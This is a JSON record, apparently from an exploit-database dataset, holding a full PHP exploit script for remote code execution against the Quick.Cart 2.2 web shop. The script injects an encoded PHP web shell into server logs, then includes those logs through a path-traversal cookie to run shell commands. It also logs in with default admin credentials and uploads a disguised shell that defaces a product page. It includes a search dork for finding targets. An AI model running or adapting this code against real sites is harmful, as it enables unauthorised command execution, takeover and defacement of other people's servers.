{
  "id": "4025",
  "title": "Quick.Cart 2.2 - Local/Remote File Inclusion / Remote Code Execution",
  "cve": "CVE-2007-3139",
  "vuln_type": "rce",
  "code": "<?php\r\n/*\r\nExploit Name:\r\nQuick.Cart <= v2.2 Remote Local Include Exploit & Remote Code Execution Exploit\r\n\r\nAutor: Kacper\r\nContact: kacper1964@yahoo.pl\r\nHomepage: http://www.rahim.webd.pl/\r\nKacper Hacking & Security Blog: http://kacper.bblog.pl/\r\nIrc: irc.milw0rm.com:6667 #devilteam \r\n\r\nPozdro dla wszystkich z kanalu IRC oraz forum DEVIL TEAM.\r\n\r\nPozdrawiam pl.zone-h.org, a najbardziej demo, oraz cala ekipe Zone-H.Org  :)\r\n\r\n//dork: \"Powered by Quick.Cart\"\r\n\r\nscript homepage/download/demo: http://opensolution.org/\r\n*/\r\n\r\nif ($argc<4) {\r\n    print_r('\r\n---------------------------------------------------------------------------\r\nUsage: php '.$argv[0].' host path cmd OPTIONS\r\nhost:      target server (ip/hostname)\r\npath:      path to Quick.Cart\r\ncmd:       a shell command\r\nOptions:\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\n -L[Login]:    Admin login (Default: admin)\r\n -H[Password]: Admin password (Default: admin)\r\nExample:\r\nphp '.$argv[0].' localhost /Quick.Cart/ ls -la\r\nphp '.$argv[0].' localhost /Quick.Cart/ ls -la -Ladmin -Hadmin\r\nphp '.$argv[0].' localhost /Quick.Cart/ ls -la -P1.1.1.1:80\r\n---------------------------------------------------------------------------\r\n');\r\ndie;\r\n}\r\nerror_reporting(7);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction wyslijpakiet($pakiet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$pakiet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$port=80;\r\n$proxy=\"\";\r\n$login=\"admin\";\r\n$haslo=\"admin\";\r\n$cmd=\"\";\r\nfor ($i=3; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>'-p') and ($temp<>'-P')) {$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-L\")\r\n{\r\n  $login=str_replace(\"-L\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-H\")\r\n{\r\n  $haslo=str_replace(\"-H\",\"\",$argv[$i]);\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'bad patch!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n/*\r\nhow its works :)\r\n\r\nin file \"config/general.php\" lines 12-33:\r\n\r\n################################################################################\r\n$config['dir_config']           = 'config/';\r\n$config['dir_core']             = 'core/';\r\n$config['dir_db']               = 'db/';\r\n$config['dir_js']               = 'js/';\r\n$config['dir_libraries']        = 'libraries/';\r\n$config['dir_tpl']              = 'templates/';\r\n$config['dir_files']            = 'files/';\r\n$config['dir_ext']              = 'ext/';\r\n$config['dir_plugins']          = 'plugins/';\r\n$config['dir_lang']             = 'lang/';\r\n\r\nif( isset( $sLang ) && is_file( $config['dir_lang'].$sLang.'.php' ) && strlen( $sLang ) == 2 ){\r\n  setCookie( 'sLanguage', $sLang, time( ) + 86400 );\r\n  define( 'LANGUAGE', $sLang );\r\n}\r\nelse{\r\n  if( isset( $_COOKIE['sLanguage'] ) )            <-------------------------[^]\r\n    define( 'LANGUAGE', $_COOKIE['sLanguage'] );    <-------------------------[^^]\r\n  else\r\n    define( 'LANGUAGE', $config['default_lang'] ); \r\n}\r\n################################################################################\r\n\r\nand in index.php we can find line 32:\r\n\r\n################################################################################\r\nrequire_once DIR_LANG.LANGUAGE.'.php'; <-------------------------[^^^]\r\n################################################################################\r\n\r\nwe can define LANGUAGE string. \r\n\r\nNow how remote code execution:\r\n\r\nin admin panel can upload any file on serwer, if you have admin login and password. Default admin login and password in script is \"admin\" many users dont change it!!\r\nThey don't edit file \"config/general.php\" lines 75-76:\r\n$config['login']\t\t= \"admin\";\r\n$config['pass']\t\t= \"admin\";\r\n\r\n;)\r\n\r\nElo :)\r\n*/\r\n\r\necho \"insert evil code in logfiles to run local include ...\\r\\n\\r\\n\";\r\n$hauru2 = base64_decode(\"PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL\".\r\n\"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS\".\r\n\"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB\".\r\n\"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj\".\r\n\"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI\".\r\n\"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX\".\r\n\"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+\");\r\n$pakiet=\"GET \".$p.$hauru2.\" HTTP/1.0\\r\\n\";\r\n$pakiet.=\"User-Agent: \".$hauru2.\" Googlebot/2.1\\r\\n\";\r\n$pakiet.=\"Host: \".$host.\"\\r\\n\";\r\n$pakiet.=\"Connection: close\\r\\n\\r\\n\";\r\nwyslijpakiet($pakiet);\r\nsleep(1);\r\n$paths= array (\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\nfor ($i=0; $i<=count($paths)-1; $i++)\r\n{$a=$i+2;\r\necho \"[\".$a.\"] Check Path: \".$paths[$i].\"\\r\\n\";\r\necho \"remote code execution...wait..\\n\";\r\n$pakiet =\"GET \".$p.\"index.php HTTP/1.1\\r\\n\";\r\n$pakiet.=\"Cookie: sLanguage=../\".$paths[$i].\"%00;\\r\\n\";\r\n$pakiet.=\"HAURU: \".$cmd.\"\\r\\n\";\r\n$pakiet.=\"Host: \".$host.\"\\r\\n\";\r\n$pakiet.=\"Connection: Close\\r\\n\\r\\n\";\r\nwyslijpakiet($pakiet);\r\nif (strstr($html,\"Hauru\"))\r\n{$temp=explode(\"Hauru\",$html);\r\ndie($temp[1]);\r\n}else{echo \"can't run evil code :/ ..\\n\";}}\r\n$data   =\"_POST[sLogin]=\".$login.\"&_POST[sPass]=\".$haslo.\"&submit=sign%20in%20&raquo;\";\r\n$pakiet =\"POST \".$p.\"admin.php?p=login HTTP/1.0\\r\\n\";\r\n$pakiet.=\"Host: \".$host.\"\\r\\n\";\r\n$pakiet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\\r\\n\";\r\n$pakiet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$pakiet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$pakiet.=\"Accept: text/plain\\r\\n\";\r\n$pakiet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$pakiet.=$data;\r\nwyslijpakiet($pakiet);\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$cookie=\"\";\r\nfor ($i=1; $i<count($temp); $i++)\r\n{$temp2=explode(\" \",$temp[$i]);\r\n$cookie.=\" \".$temp2[0];}\r\n$temp=explode(\"PHPSESSID=\",$cookie);\r\n$temp2=explode(\";\",$temp[1]);\r\n$ciacho=$temp2[0];\r\necho \"Now remote code execution with admin account..\\n\";\r\necho $ciacho.\"\\n\";\r\n$hauru=\r\n\"\\x20\\x0d\\x0a\\x47\\x49\\x46\\x38\\x36\\x0d\\x0a\\x3c\\x3f\\x70\\x68\\x70\\x20\".\r\n\"\\x6f\\x62\\x5f\\x63\\x6c\\x65\\x61\\x6e\\x28\\x29\\x3b\\x0d\\x0a\\x2f\\x2f\\x52\".\r\n\"\\x75\\x63\\x68\\x6f\\x6d\\x79\\x20\\x7a\\x61\\x6d\\x65\\x6b\\x20\\x48\\x61\\x75\".\r\n\"\\x72\\x75\\x20\\x3b\\x2d\\x29\\x0d\\x0a\\x65\\x63\\x68\\x6f\\x22\\x2e\\x2e\\x2e\".\r\n\"\\x48\\x61\\x63\\x6b\\x65\\x72\\x2e\\x2e\\x4b\\x61\\x63\\x70\\x65\\x72\\x2e\\x2e\".\r\n\"\\x4d\\x61\\x64\\x65\\x2e\\x2e\\x69\\x6e\\x2e\\x2e\\x50\\x6f\\x6c\\x61\\x6e\\x64\".\r\n\"\\x21\\x21\\x2e\\x2e\\x2e\\x44\\x45\\x56\\x49\\x4c\\x2e\\x54\\x45\\x41\\x4d\\x2e\".\r\n\"\\x2e\\x74\\x68\\x65\\x2e\\x2e\\x62\\x65\\x73\\x74\\x2e\\x2e\\x70\\x6f\\x6c\\x69\".\r\n\"\\x73\\x68\\x2e\\x2e\\x74\\x65\\x61\\x6d\\x2e\\x2e\\x47\\x72\\x65\\x65\\x74\\x7a\".\r\n\"\\x2e\\x2e\\x2e\\x22\\x3b\\x0d\\x0a\\x20\\x0d\\x0a\\x20\\x0d\\x0a\\x65\\x63\\x68\".\r\n\"\\x6f\\x22\\x2e\\x2e\\x2e\\x47\\x6f\\x20\\x54\\x6f\\x20\\x44\\x45\\x56\\x49\\x4c\".\r\n\"\\x20\\x54\\x45\\x41\\x4d\\x20\\x49\\x52\\x43\\x3a\\x20\\x37\\x32\\x2e\\x32\\x30\".\r\n\"\\x2e\\x31\\x38\\x2e\\x36\\x3a\\x36\\x36\\x36\\x37\\x20\\x23\\x64\\x65\\x76\\x69\".\r\n\"\\x6c\\x74\\x65\\x61\\x6d\\x22\\x3b\\x0d\\x0a\\x20\\x0d\\x0a\\x20\\x0d\\x0a\\x65\".\r\n\"\\x63\\x68\\x6f\\x22\\x2e\\x2e\\x2e\\x44\\x45\\x56\\x49\\x4c\\x20\\x54\\x45\\x41\".\r\n\"\\x4d\\x20\\x53\\x49\\x54\\x45\\x3a\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\".\r\n\"\\x77\\x77\\x2e\\x72\\x61\\x68\\x69\\x6d\\x2e\\x77\\x65\\x62\\x64\\x2e\\x70\\x6c\".\r\n\"\\x2f\\x22\\x3b\\x0d\\x0a\\x20\\x0d\\x0a\\x20\\x0d\\x0a\\x69\\x6e\\x69\\x5f\\x73\".\r\n\"\\x65\\x74\\x28\\x22\\x6d\\x61\\x78\\x5f\\x65\\x78\\x65\\x63\\x75\\x74\\x69\\x6f\".\r\n\"\\x6e\\x5f\\x74\\x69\\x6d\\x65\\x22\\x2c\\x30\\x29\\x3b\\x0d\\x0a\\x20\\x0d\\x0a\".\r\n\"\\x20\\x0d\\x0a\\x65\\x63\\x68\\x6f\\x20\\x22\\x48\\x61\\x75\\x72\\x75\\x22\\x3b\".\r\n\"\\x0d\\x0a\\x20\\x0d\\x0a\\x20\\x0d\\x0a\\x70\\x61\\x73\\x73\\x74\\x68\\x72\\x75\".\r\n\"\\x28\\x24\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\\x5b\\x48\\x54\\x54\\x50\\x5f\\x48\".\r\n\"\\x41\\x55\\x52\\x55\\x5d\\x29\\x3b\\x0d\\x0a\\x20\\x0d\\x0a\\x20\\x0d\\x0a\\x64\".\r\n\"\\x69\\x65\\x3b\\x3f\\x3e\\x0d\\x0a\\x20\";\r\n$data.='-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"sName\"\r\n\r\nDEVIL TEAM\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"aCategories[]\"\r\n\r\n1\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"fPrice\"\r\n\r\n10000000.00\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"sDescriptionShort\"\r\n\r\nHacked by Polish Hackers\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"sDescriptionFull\"\r\n\r\nhttp://www.rahim.webd.pl/\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"iPosition\"\r\n\r\n-99\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"iStatus\"\r\n\r\n1\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"aFiles[]\"; filename=\"hauru.php\"\r\nContent-Type: text/plain\r\n\r\n'.$hauru.'\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"aFilesDescription[]\"\r\n\r\n1\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"aFilesPosition[]\"\r\n\r\n1\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"iProduct\"\r\n\r\n\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"sOption\"\r\n\r\nsave\r\n-----------------------------7d6224c08dc\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nzapisz &raquo;\r\n-----------------------------7d6224c08dc--\r\n';\r\n$pakiet =\"POST \".$p.\"admin.php?p=productsList&sOption=save HTTP/1.0\\r\\n\";\r\n$pakiet.=\"Content-Type: multipart/form-data; boundary=-----------------------------7d6224c08dc\\r\\n\";\r\n$pakiet.=\"Accept-Language: pl\\r\\n\";\r\n$pakiet.=\"Proxy-Connection: Keep-Alive\\r\\n\";\r\n$pakiet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\\r\\n\";\r\n$pakiet.=\"Cookie: sLogin=\".$login.\"; PHPSESSID=\".$ciacho.\"\\r\\n\";\r\n$pakiet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$pakiet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$pakiet.=$data;\r\nwyslijpakiet($pakiet);\r\nsleep(1);\r\necho \"Now try to remote code execution...\\n\";\r\n$pakiet =\"GET \".$p.\"files/hauru.php HTTP/1.1\\r\\n\";\r\n$pakiet.=\"HAURU: \".$cmd.\"\\r\\n\";\r\n$pakiet.=\"Host: \".$host.\"\\r\\n\";\r\n$pakiet.=\"Connection: Close\\r\\n\\r\\n\";\r\nwyslijpakiet($pakiet);\r\nif (strstr($html,\"Hauru\"))\r\n{$temp=explode(\"Hauru\",$html);\r\ndie($temp[1]);}\r\necho \"Cant find evil file :/    maybe this version script is too old but is not vulnerable ...\";\r\necho \"Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam \";\r\n?>\r\n\r\n# milw0rm.com [2007-06-02]",
  "url": "https://www.exploit-db.com/exploits/4025"
}